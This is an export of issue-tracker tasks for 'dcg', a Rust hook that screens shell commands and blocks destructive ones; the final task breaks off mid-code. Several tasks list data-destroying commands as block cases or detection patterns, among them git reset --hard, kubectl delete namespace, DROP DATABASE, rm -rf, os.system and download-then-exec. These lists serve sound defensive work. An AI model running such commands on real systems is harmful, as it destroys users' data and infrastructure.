{"id":"git_safety_guard-99e.3.3","title":"Refactor CLI dcg test to share evaluator semantics","description":"## Objective\n\nEnsure `dcg test` uses the same normalization, override evaluation, context layers, and pack evaluation ordering as hook mode.\n\n## Acceptance criteria\n\n- `dcg test` and hook-mode JSON input agree on allow/deny + attribution for the same command.\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:01:02.50501207-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:01:02.50501207-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.3.3","depends_on_id":"git_safety_guard-99e.3","type":"parent-child","created_at":"2026-01-07T20:01:02.506104728-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.3.3","depends_on_id":"git_safety_guard-99e.3.1","type":"blocks","created_at":"2026-01-07T20:12:59.224813761-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.3.4","title":"Remove legacy SAFE_PATTERNS/DESTRUCTIVE_PATTERNS from src/main.rs","description":"## Objective\n\nEliminate the legacy hardcoded pattern lists in `src/main.rs` once parity with packs is verified.\n\n## Why\n\nDuplication increases risk of divergence and makes it harder to reason about false positives. The legacy `SAFE_PATTERNS` and `DESTRUCTIVE_PATTERNS` in `src/main.rs` overlap with `core.git` and `core.filesystem` packs.\n\n## Pre-Removal Verification (CRITICAL)\n\nBefore removing ANY legacy code, we MUST verify parity:\n\n### Step 1: Create Parity Test Corpus\n\n```bash\n# Create test corpus from legacy patterns\nmkdir -p tests/corpus/legacy_parity\n```\n\nFor each legacy pattern:\n1. Extract example commands that match the pattern\n2. Record expected allow/deny decision\n3. Save to `tests/corpus/legacy_parity/`\n\n### Step 2: Run Comparison\n\n```rust\n#[test]\nfn test_legacy_pack_parity() {\n    let corpus = load_parity_corpus();\n\n    for case in corpus {\n        // Run through legacy matcher\n        let legacy_result = legacy_check(\u0026case.command);\n\n        // Run through pack-based matcher\n        let pack_result = pack_check(\u0026case.command);\n\n        assert_eq!(\n            legacy_result.decision,\n            pack_result.decision,\n            \"Parity mismatch for: {}\",\n            case.command\n        );\n    }\n}\n```\n\n### Step 3: Document Intentional Differences\n\nIf packs intentionally differ from legacy (e.g., fixing a false positive):\n- Document the difference in a comment\n- Add a test case proving the new behavior is correct\n- Get explicit sign-off before proceeding\n\n## Removal Process\n\n1. **Audit Phase**\n   - List all legacy SAFE_PATTERNS with line numbers\n   - List all legacy DESTRUCTIVE_PATTERNS with line numbers\n   - Map each to corresponding pack pattern\n\n2. **Parity Phase**\n   - Run parity tests (must pass 100%)\n   - Document any intentional differences\n\n3. **Removal Phase**\n   - Remove legacy pattern definitions\n   - Remove legacy matching code paths\n   - Update tests that referenced legacy patterns\n\n4. **Verification Phase**\n   - All existing unit tests pass\n   - All E2E tests pass\n   - Run full regression corpus\n\n## Legacy Patterns to Remove\n\n### SAFE_PATTERNS (src/main.rs)\n- `git status`, `git diff`, `git log`, etc.\n- These should be covered by `core.git` safe patterns\n\n### DESTRUCTIVE_PATTERNS (src/main.rs)\n- `git reset --hard`, `git clean -fd`, etc.\n- These should be covered by `core.git` destructive patterns\n\n## Risk Mitigation\n\n- Create a feature flag: `--legacy-patterns` to temporarily re-enable\n- Keep legacy code commented (not deleted) for 2 weeks\n- Monitor for regression reports\n\n## Acceptance Criteria\n\n- All existing unit + E2E tests still pass.\n- `core.git` and `core.filesystem` packs fully cover the legacy behavior.\n- Parity test corpus is checked into the repo.\n- No decision changes for any existing test case (unless intentional and documented).","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T20:01:07.537906195-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:22:29.419091182-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.3.4","depends_on_id":"git_safety_guard-99e.3","type":"parent-child","created_at":"2026-01-07T20:01:07.539030542-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.3.4","depends_on_id":"git_safety_guard-99e.3.2","type":"blocks","created_at":"2026-01-07T20:13:04.258280353-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.3.4","depends_on_id":"git_safety_guard-99e.3.3","type":"blocks","created_at":"2026-01-07T20:13:09.290073454-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.3.5","title":"Add hook/CLI evaluator parity tests","description":"## Objective\n\nAdd tests that assert the shared evaluator produces identical decisions regardless of entrypoint.\n\n## Acceptance criteria\n\n- A table-driven test feeds commands to:\n  - hook JSON path\n  - CLI test path\n  and asserts identical results.\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:01:12.571055269-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:08:26.771987868-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.3.5","depends_on_id":"git_safety_guard-99e.3","type":"parent-child","created_at":"2026-01-07T20:01:12.572353334-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.3.5","depends_on_id":"git_safety_guard-99e.3.2","type":"blocks","created_at":"2026-01-07T20:13:14.322063967-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.3.5","depends_on_id":"git_safety_guard-99e.3.3","type":"blocks","created_at":"2026-01-07T20:13:19.353820038-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.4","title":"Precompile config override regexes (no per-command compilation)","description":"## Objective\n\nEliminate per-invocation regex compilation for config overrides.\n\n## Background\n\nHook mode currently compiles override regexes on every command:\n\n- allow overrides: `Regex::new(allow.pattern())` in the hot path\n- block overrides: `Regex::new(\u0026block.pattern)` in the hot path\n\nThis is:\n\n- slow (regex compilation is expensive relative to typical command length)\n- unpredictable (worst-case time spikes)\n- potentially abusable (a malicious or accidental heavy regex)\n\n## Proposed approach\n\n- At config load time, compile all override patterns once.\n- Store them in a runtime representation (e.g., `CompiledOverrides`) separate from the serde config struct.\n- Invalid override regexes should be handled explicitly:\n  - either: treat as configuration error and disable the override with a warning\n  - or: fail closed on startup (probably not desired for a hook)\n\nRecommendation: **fail open but log** for invalid regex, so the hook keeps working.\n\n## Acceptance criteria\n\n- No `Regex::new(...)` calls exist on the per-command hot path for overrides.\n- Unit tests cover:\n  - valid allow override match\n  - valid block override match\n  - invalid regex handling path\n- Performance: repeated allow decisions do not allocate.\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:01:26.682700605-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:01:26.682700605-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.4","depends_on_id":"git_safety_guard-99e","type":"parent-child","created_at":"2026-01-07T20:01:26.683820875-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.4.1","title":"Implement CompiledOverrides (compile allow/block once)","description":"## Objective\n\nIntroduce a runtime-only representation of overrides that holds compiled regexes.\n\n## Implementation notes\n\n- Keep serde structs unchanged for config file parsing.\n- Add a post-load step: `Config::compile()` (or similar) producing `CompiledConfig`.\n- Ensure this does not allocate on allow hot path.\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:01:38.406830854-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:01:38.406830854-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.4.1","depends_on_id":"git_safety_guard-99e.4","type":"parent-child","created_at":"2026-01-07T20:01:38.408007751-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.4.2","title":"Unit tests: override regex precompilation + invalid regex behavior","description":"## Objective\n\nLock in behavior around compiled overrides.\n\n## Test cases\n\n- allow override compiled and matches\n- block override compiled and matches\n- invalid regex is ignored (or causes explicit warning) but does not crash\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:01:43.440192699-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:01:43.440192699-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.4.2","depends_on_id":"git_safety_guard-99e.4","type":"parent-child","created_at":"2026-01-07T20:01:43.441311226-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.4.2","depends_on_id":"git_safety_guard-99e.4.1","type":"blocks","created_at":"2026-01-07T20:13:34.454747249-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.5","title":"Naming alignment: dcg vs git_safety_guard (env vars, scripts, docs)","description":"## Objective\n\nEliminate naming drift so the project is coherent and user setups are not confusing/brittle.\n\n## Background\n\nThe repo has evidence of a previous name (`git_safety_guard`) mixed with the current name (`dcg` / `destructive_command_guard`). Examples:\n\n- Build script header comment references `git_safety_guard`.\n- Config env prefix is `GIT_SAFETY_GUARD_*`.\n- `scripts/e2e_test.sh` searches for a `git_safety_guard` binary.\n- README uses both `dcg` and old references in places.\n\nThis increases misconfiguration risk (users set the wrong env var or run the wrong binary name).\n\n## Proposed approach\n\n- Choose a single canonical name:\n  - CLI/binary: `dcg`\n  - crate: `destructive_command_guard`\n  - env vars: `DCG_*` (or `DCG_GUARD_*`, but keep it short)\n- Update:\n  - docs\n  - installer scripts\n  - E2E script\n  - internal comments\n\n## Compatibility stance\n\nThis project explicitly does not require backwards compatibility; prioritize clarity and correctness.\n\nIf we *do* want a short transition period:\n\n- temporarily accept both env prefixes (DCG_* and old) with explicit deprecation warnings.\n\n## Acceptance criteria\n\n- E2E script runs against `dcg`.\n- README and help text consistently reference `dcg`.\n- Environment variables are documented and coherent.\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:02:00.117945499-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:02:00.117945499-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.5","depends_on_id":"git_safety_guard-99e","type":"parent-child","created_at":"2026-01-07T20:02:00.119165156-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.6","title":"Extend e2e_test.sh to cover non-core packs (docker/k8s/db)","description":"## Objective\n\nMake the E2E suite reflect the actual feature set by adding coverage for non-core packs (Docker/Kubernetes/Databases/etc.).\n\n## Background\n\nThe current `scripts/e2e_test.sh` primarily tests git/rm behavior and quick-reject. It does not assert that other packs work in hook mode.\n\nGiven the prior pack-reachability bug, E2E coverage here is essential.\n\n## Test cases to add\n\n### Docker (containers.docker)\n\n- BLOCK: `docker system prune`\n- BLOCK: `docker volume prune`\n- ALLOW: `docker ps`\n\n### Kubernetes (kubernetes.kubectl)\n\n- BLOCK: `kubectl delete namespace test`\n- BLOCK: `kubectl delete pods --all`\n- ALLOW: `kubectl get pods`\n\n### PostgreSQL (database.postgresql)\n\n- BLOCK: `DROP DATABASE prod;`\n- BLOCK: `DELETE FROM users;` (no WHERE)\n- ALLOW: `SELECT 1;`\n\nNotes:\n- These packs may require explicit enablement in config for E2E.\n\n## Logging requirements\n\n- Print pack enablement used for the test run.\n- For blocked cases, print `pack_id/pattern_name` once available.\n\n## Acceptance criteria\n\n- E2E fails if non-core packs are not applied in hook mode.\n- E2E output remains readable and provides an actionable failure summary.\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:09:28.277919173-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:09:28.277919173-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.6","depends_on_id":"git_safety_guard-99e","type":"parent-child","created_at":"2026-01-07T20:09:28.281119721-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.6","depends_on_id":"git_safety_guard-99e.1.1","type":"blocks","created_at":"2026-01-07T20:09:38.597030952-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.6","depends_on_id":"git_safety_guard-99e.5","type":"blocks","created_at":"2026-01-07T20:09:43.731546912-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.6","depends_on_id":"git_safety_guard-99e.2.2","type":"blocks","created_at":"2026-01-07T20:09:48.791918426-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.7","title":"Performance benchmarks: core pipeline (quick reject, packs, overrides)","description":"## Objective\n\nAdd benchmarks to prevent accidental performance regressions in the hot path.\n\n## Background\n\nEvery Bash command passes through `dcg`, so even small slowdowns are noticeable.\n\nRecent/planned changes that need measurement:\n\n- pack-aware global quick reject\n- deterministic pack ordering\n- compiled overrides\n- shared evaluator refactor\n\n## Benchmark plan\n\nUse Criterion (or existing preferred benchmarking strategy) to measure:\n\n1. Non-matching command (e.g., `ls -la`) â†’ should be ultra-fast.\n2. Matching keyword but safe (e.g., `git status`, `docker ps`) â†’ should be fast.\n3. Blocked command (e.g., `git reset --hard`, `docker system prune`) â†’ still fast.\n4. Worst-case enabled packs (many categories enabled) â†’ ensure keyword gating keeps it bounded.\n\nMetrics:\n\n- median and p95 latency\n- allocations count (optional)\n\n## Acceptance criteria\n\n- Benchmarks can run locally and in CI (optionally behind a flag).\n- We establish a baseline and add a guardrail (document expected ranges).\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T20:10:22.191884568-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:10:22.191884568-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.7","depends_on_id":"git_safety_guard-99e","type":"parent-child","created_at":"2026-01-07T20:10:22.202468401-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.7","depends_on_id":"git_safety_guard-99e.3.1","type":"blocks","created_at":"2026-01-07T20:10:35.355609636-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.7","depends_on_id":"git_safety_guard-99e.1.1","type":"blocks","created_at":"2026-01-07T20:10:40.388964799-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.7","depends_on_id":"git_safety_guard-99e.4.1","type":"blocks","created_at":"2026-01-07T20:10:45.422917247-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.8","title":"Optional: token-aware keyword gating (reduce substring false triggers)","description":"## Objective\n\nImprove keyword gating so it is less substring-based and more shell-token aware.\n\n## Background\n\nCurrent gating uses raw substring search (`memmem::find`) for keywords like `git`, `rm`, `docker`, etc.\n\nThis can cause unnecessary pack evaluation on commands like:\n\n- `cat .gitignore` (contains `git`)\n- `echo digit` (contains `git`)\n\nWhile this usually still allows, it:\n\n- adds unnecessary overhead\n- increases risk of accidental false positives if any future pattern is less strictly anchored\n\n## Proposed approach\n\n- Reuse the execution-context tokenizer to locate the first word of each command segment.\n- Apply pack keyword gating primarily to:\n  - segment command name\n  - unquoted words in executable contexts\n\nIf tokenizer is not yet available, consider a cheap boundary heuristic:\n\n- only treat `git` as present if it appears as a whole word boundary (`\\bgit\\b`) (but beware performance of regex; prefer manual boundary checks)\n\n## Acceptance criteria\n\n- Demonstrated reduction in unnecessary pack evaluations (microbench).\n- No false negatives introduced (must not miss real `git`/`rm` invocations).\n","status":"open","priority":3,"issue_type":"task","created_at":"2026-01-07T20:11:56.523038338-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:11:56.523038338-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.8","depends_on_id":"git_safety_guard-99e","type":"parent-child","created_at":"2026-01-07T20:11:56.524256502-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.8","depends_on_id":"git_safety_guard-t8x.2","type":"blocks","created_at":"2026-01-07T20:12:05.614037376-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.9","title":"Audit pack keyword gating (avoid false negatives; tune performance)","description":"## Objective\n\nEnsure pack-level keyword gating (`Pack.keywords` + `Pack::might_match`) does not introduce false negatives and provides good performance.\n\n## Background\n\nEach pack uses a keyword list as a quick reject:\n\n- If **no keyword** is found, the pack skips all pattern matching.\n\nThis is a performance feature, but it is also a correctness risk:\n\n- Missing keywords can cause false negatives (dangerous commands allowed).\n\nOnce we fix global pack reachability, keyword gating becomes even more important.\n\n## Work plan\n\n1. For each built-in pack:\n   - review each destructive regex\n   - ensure at least one keyword reliably appears in realistic invocations that should match\n\n2. Add unit tests per pack:\n   - at least 1 â€œkeyword present â†’ pattern matchesâ€ test\n   - at least 1 â€œkeyword absent â†’ pack skippedâ€ test (only where correct)\n\n3. Consider whether certain packs should have empty keywords (always check) if patterns are cheap or risks are high.\n\n## Acceptance criteria\n\n- No pack has a destructive pattern that can match a realistic command without containing any of the packâ€™s keywords.\n- Added tests would fail if keywords are removed or patterns are expanded unsafely.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T20:14:33.930128304-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:14:33.930128304-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.9","depends_on_id":"git_safety_guard-99e","type":"parent-child","created_at":"2026-01-07T20:14:33.940902065-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.9","depends_on_id":"git_safety_guard-99e.1.1","type":"blocks","created_at":"2026-01-07T20:14:45.431462888-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-b45","title":"Research ast-grep API and integration patterns","description":"# Research ast-grep API and Integration Patterns\n\n## Objective\nThoroughly understand ast-grep's capabilities, API, and integration options to make informed architecture decisions.\n\n## Background\nast-grep (https://ast-grep.github.io/) is a CLI tool and library for structural code search. It uses tree-sitter for parsing and provides a pattern matching language for AST nodes. We need to understand how to leverage it for detecting destructive patterns in heredoc content.\n\n## Research Areas\n\n### 1. CLI Interface\n- Command syntax for pattern matching\n- JSON output format (--json flag)\n- Language specification options\n- Performance characteristics (startup time, parsing speed)\n- Error handling and edge cases\n\n### 2. Pattern Language\n- Basic pattern syntax ($VAR for metavariables)\n- Pattern composition and nesting\n- Regex support within patterns\n- Multiple pattern matching\n- YAML rule files vs inline patterns\n\n### 3. Language Support\n- Which languages are supported out of the box?\n- How are languages detected/specified?\n- Can we add custom language support?\n- Tree-sitter grammar availability\n\n### 4. Library Integration (sg crate)\n- Is there a Rust library we can use directly?\n- API surface and documentation\n- Dependency graph and compile time impact\n- Memory usage patterns\n\n### 5. Performance Benchmarks\n- Time to parse small code snippets (10-100 lines)\n- Pattern matching overhead\n- Comparison: CLI invocation vs library calls\n- Caching possibilities\n\n## Deliverables\n- Document summarizing findings\n- Code snippets demonstrating CLI and library usage\n- Performance benchmark results\n- Recommendation for integration approach\n\n## Success Criteria\n- Can confidently choose between CLI and library integration\n- Understand pattern language well enough to write destructive patterns\n- Have baseline performance numbers for decision making\n\n## Resources\n- https://ast-grep.github.io/\n- https://github.com/ast-grep/ast-grep\n- https://tree-sitter.github.io/tree-sitter/","notes":"Research completed: ast-grep-core v0.40.4 available on crates.io. Provides Pattern struct and Matcher trait. Depends on tree-sitter ^0.26.3. Intuitive pattern syntax like 'os.system($CMD)'. Recommended approach for dcg.","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T18:28:24.602476336-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:46:12.030060139-05:00"}
{"id":"git_safety_guard-beq","title":"Define Python destructive patterns for heredoc scanning","description":"# Define Python Destructive Patterns for Heredoc Scanning\n\n## Objective\nCreate ast-grep/tree-sitter patterns to detect destructive operations in Python heredoc content.\n\n## Background\nPython offers many ways to perform destructive operations. We need comprehensive patterns that catch common attack vectors while minimizing false positives.\n\n## Patterns to Implement\n\n### 1. File System Operations\n\n**Direct file deletion:**\n- os.remove(path)\n- os.unlink(path)\n- pathlib.Path(path).unlink()\n- shutil.rmtree(path)\n- shutil.move() when destination exists\n\n**ast-grep pattern examples:**\n```yaml\nid: python-os-remove\nlanguage: python\nrule:\n  pattern: os.remove($PATH)\n  message: \"os.remove() deletes files - verify path is safe\"\n\nid: python-shutil-rmtree  \nlanguage: python\nrule:\n  pattern: shutil.rmtree($PATH)\n  message: \"shutil.rmtree() recursively deletes directories\"\n```\n\n### 2. Command Execution\n\n**Shell commands:**\n- os.system(cmd)\n- os.popen(cmd)\n- subprocess.run(cmd, shell=True)\n- subprocess.call(cmd, shell=True)\n- subprocess.Popen(cmd, shell=True)\n\n**ast-grep patterns:**\n```yaml\nid: python-os-system\nlanguage: python\nrule:\n  pattern: os.system($CMD)\n  message: \"os.system() executes shell commands\"\n\nid: python-subprocess-shell\nlanguage: python\nrule:\n  any:\n    - pattern: subprocess.run($$$, shell=True, $$$)\n    - pattern: subprocess.call($$$, shell=True, $$$)\n    - pattern: subprocess.Popen($$$, shell=True, $$$)\n  message: \"subprocess with shell=True executes arbitrary commands\"\n```\n\n### 3. Code Execution\n\n**Dynamic execution:**\n- exec(code)\n- eval(code)\n- compile() + exec()\n\n### 4. Database Operations\n\n**Destructive SQL:**\n- cursor.execute(\"DROP ...\")\n- cursor.execute(\"TRUNCATE ...\")\n- cursor.execute(\"DELETE FROM ... WHERE 1=1\")\n\nNote: These require checking string content, which is harder.\n\n### 5. Network/Download and Execute\n\n**Dangerous patterns:**\n- urllib.request.urlopen() + exec()\n- requests.get() + exec()\n\n## Pattern File Location\n- src/heredoc/patterns/python.yml\n- Or embedded in Rust code\n\n## Severity Levels\n- Critical: os.system, subprocess with shell, exec/eval\n- High: shutil.rmtree, os.remove\n- Medium: subprocess without shell (less dangerous)\n\n## False Positive Mitigation\n- Don't flag imports alone (import os is fine)\n- Consider context (test files, documentation)\n- Allow configuration to disable specific patterns\n\n## Testing\n- Test each pattern matches its target\n- Test patterns don't match safe code\n- Test edge cases (different import styles, aliases)\n\n## Dependencies\n- Design: pattern library structure (git_safety_guard-6sg)\n- ast-grep invocation (git_safety_guard-f4f)\n\n## Success Criteria\n- Cover top 10 dangerous Python patterns\n- Reasonable false positive rate (\u003c5%)\n- Patterns validated against real-world code","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T18:32:51.428196157-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:32:51.428196157-05:00","dependencies":[{"issue_id":"git_safety_guard-beq","depends_on_id":"git_safety_guard-6sg","type":"blocks","created_at":"2026-01-07T18:34:20.583247557-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-beq","depends_on_id":"git_safety_guard-f4f","type":"blocks","created_at":"2026-01-07T18:34:20.601617242-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-boy","title":"Evaluate embedded Rust crates vs external binaries for AST analysis","description":"## Objective\n\nEmbed structural analysis directly in the dcg binary using Rust crates rather than shelling out to external tools.\n\n## Architecture Decision\n\n**DECISION: Embed tree-sitter and ast-grep-core in Rust binary**\n\n### Why Not External Binaries?\n\nExternal process invocation (ripgrep CLI, ast-grep CLI) has unacceptable overhead:\n- Process spawn: 5-20ms\n- IPC serialization: 1-5ms\n- Output parsing: 1-2ms\n- Total: 10-50ms per command\n\nSince dcg runs on EVERY bash command, this latency is unacceptable. Users would notice slowdown.\n\n### Why Embedded Rust Crates?\n\n1. **tree-sitter** is available as a Rust crate with excellent performance\n2. **ast-grep is written in Rust** - we may be able to use ast-grep-core directly\n3. **Language grammars** are available as Rust crates (tree-sitter-bash, etc.)\n4. **Sub-millisecond latency** when everything is compiled in\n5. **Single binary** - no \"install ast-grep\" requirement\n\n### Implementation Strategy\n\n#### Phase 1: tree-sitter Integration\n```toml\n[dependencies]\ntree-sitter = \"0.22\"\ntree-sitter-bash = \"0.21\"\ntree-sitter-python = \"0.21\"\ntree-sitter-javascript = \"0.21\"\n# ... etc\n```\n\n#### Phase 2: Pattern Matching\n\nTwo options:\n\n**Option A: tree-sitter Queries**\nUse tree-sitter's built-in query language (S-expressions):\n```scheme\n(command\n  name: (command_name) @cmd\n  argument: (word) @arg\n  (#eq? @cmd \"rm\")\n  (#match? @arg \"-rf\"))\n```\n\nPros: Built into tree-sitter, well-documented\nCons: Verbose, less expressive than ast-grep patterns\n\n**Option B: ast-grep-core Crate**\nIf ast-grep publishes a library crate, use it:\n```rust\nuse ast_grep_core::{Pattern, Matcher};\n\nlet pattern = Pattern::new(\"os.system($CMD)\")?;\nlet matches = pattern.find_all(\u0026python_ast);\n```\n\nPros: More expressive patterns, proven matching logic\nCons: May not be published as separate crate, may need vendoring\n\n**Option C: Vendor ast-grep Code**\nIf ast-grep-core isn't available as a crate:\n1. Clone ast-grep repo\n2. Extract relevant modules (pattern matching, not CLI)\n3. Vendor into our codebase\n4. Maintain minimal fork\n\nPros: Full control\nCons: Maintenance burden\n\n#### Recommendation: Try in order A â†’ B â†’ C\n\n1. Start with tree-sitter queries - simplest, no extra deps\n2. If queries are too limiting, try ast-grep-core crate\n3. If not available, vendor minimal ast-grep code\n\n### Performance Budget\n\nTarget latency for heredoc analysis:\n- Heredoc detection (regex): \u003c0.5ms\n- Content extraction: \u003c0.1ms\n- tree-sitter parse: \u003c2ms (for typical heredoc size)\n- Pattern matching: \u003c1ms\n- **Total: \u003c5ms worst case**\n\n### Binary Size Considerations\n\nEach tree-sitter grammar adds ~500KB-2MB to binary size.\n6 languages Ã— 1MB average = ~6MB added\n\nMitigation:\n- Compile grammars with size optimization\n- Consider optional features (--features python,bash,js)\n- Default: most common languages (bash, python, js)\n- Extended: all languages\n\n### Research Tasks Update\n\nThis decision affects:\n- git_safety_guard-b45: Research should focus on ast-grep's Rust internals\n- git_safety_guard-2j3: This becomes primary focus - tree-sitter Rust bindings\n- git_safety_guard-5ib: ADR should document this embedded approach\n\n## Success Criteria\n\n- All parsing embedded in single binary\n- No external tool dependencies\n- Heredoc analysis completes in \u003c5ms\n- Binary size increase \u003c10MB\n- Pattern matching expressiveness sufficient for all use cases\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T18:39:01.437304904-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:39:09.138923635-05:00","dependencies":[{"issue_id":"git_safety_guard-boy","depends_on_id":"git_safety_guard-b45","type":"blocks","created_at":"2026-01-07T18:39:09.157751983-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-boy","depends_on_id":"git_safety_guard-2j3","type":"blocks","created_at":"2026-01-07T18:39:09.175608651-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-cpal","title":"Implement custom pattern allowlisting for heredoc scanning","description":"# Custom Pattern Allowlisting\n\n## Objective\n\nAllow users to define custom allowlist patterns for heredocs that are known-safe in their environment.\n\n## Use Cases\n\n1. **Internal tools**: Company has internal scripts that trigger false positives\n2. **Test environments**: CI/CD scripts that intentionally use destructive patterns\n3. **Development workflows**: Developers who understand the risks\n\n## Configuration Format\n\n```toml\n# ~/.config/dcg/config.toml\n\n[heredoc.allowlist]\n# Allow specific commands entirely\ncommands = [\n    \"./scripts/cleanup.sh\",\n    \"/opt/company/internal-tool\",\n]\n\n# Allow specific patterns in heredocs\npatterns = [\n    { language = \"python\", pattern = \"our_safe_module.cleanup()\", reason = \"Internal cleanup tool\" },\n    { language = \"bash\", pattern = \"docker system prune\", reason = \"CI cleanup\" },\n]\n\n# Allow heredocs matching specific content hashes (SHA256)\ncontent_hashes = [\n    { hash = \"abc123...\", reason = \"Approved deployment script v1.2\" },\n]\n\n# Per-project overrides\n[[heredoc.allowlist.projects]]\npath = \"/home/user/trusted-project\"\npatterns = [\n    { language = \"bash\", pattern = \"rm -rf ./build\", reason = \"Build cleanup\" },\n]\n```\n\n## Implementation\n\n```rust\n#[derive(Debug, Deserialize)]\nstruct AllowlistConfig {\n    commands: Vec\u003cString\u003e,\n    patterns: Vec\u003cAllowedPattern\u003e,\n    content_hashes: Vec\u003cContentHash\u003e,\n    projects: Vec\u003cProjectOverride\u003e,\n}\n\n#[derive(Debug, Deserialize)]\nstruct AllowedPattern {\n    language: Option\u003cLanguage\u003e,\n    pattern: String,\n    reason: String,\n}\n\nimpl AllowlistConfig {\n    fn is_allowed(\u0026self, cmd: \u0026str, heredoc: \u0026HeredocInfo) -\u003e Option\u003c\u0026str\u003e {\n        // Check command allowlist\n        for allowed_cmd in \u0026self.commands {\n            if cmd.starts_with(allowed_cmd) {\n                return Some(\"Command in allowlist\");\n            }\n        }\n        \n        // Check pattern allowlist\n        for pattern in \u0026self.patterns {\n            if pattern.language.map_or(true, |l| l == heredoc.language) {\n                if heredoc.content.contains(\u0026pattern.pattern) {\n                    return Some(\u0026pattern.reason);\n                }\n            }\n        }\n        \n        // Check content hash\n        let hash = sha256(\u0026heredoc.content);\n        for ch in \u0026self.content_hashes {\n            if ch.hash == hash {\n                return Some(\u0026ch.reason);\n            }\n        }\n        \n        None\n    }\n}\n```\n\n## CLI Support\n\n```bash\n# Add pattern to allowlist\ndcg allowlist add --language python --pattern \"my_tool.run()\" --reason \"Internal tool\"\n\n# Add current command to allowlist (interactive)\ndcg allowlist add-current\n\n# List allowlist entries\ndcg allowlist list\n\n# Remove entry\ndcg allowlist remove --id 3\n\n# Generate hash for content\ndcg allowlist hash \u003c script.py\n```\n\n## Security Considerations\n\n1. **Audit logging**: Log all allowlist matches\n2. **Minimal scope**: Encourage specific patterns over broad ones\n3. **Expiration**: Optional expiry dates for temporary allowances\n4. **Team sharing**: Project-level allowlists in version control\n\n## Test Cases\n\n```rust\n#[test]\nfn test_command_allowlist() {\n    let config = AllowlistConfig {\n        commands: vec![\"./scripts/approved.sh\".to_string()],\n        ..Default::default()\n    };\n    \n    assert!(config.is_allowed(\"./scripts/approved.sh arg1\", \u0026heredoc).is_some());\n    assert!(config.is_allowed(\"./scripts/other.sh\", \u0026heredoc).is_none());\n}\n\n#[test]\nfn test_pattern_allowlist() {\n    let config = AllowlistConfig {\n        patterns: vec![AllowedPattern {\n            language: Some(Language::Python),\n            pattern: \"company_tool.cleanup()\".to_string(),\n            reason: \"Approved\".to_string(),\n        }],\n        ..Default::default()\n    };\n    \n    let heredoc = HeredocInfo {\n        content: \"import company_tool\\ncompany_tool.cleanup()\".to_string(),\n        language: Language::Python,\n        ..Default::default()\n    };\n    \n    assert!(config.is_allowed(\"python3 \u003c\u003cEOF\", 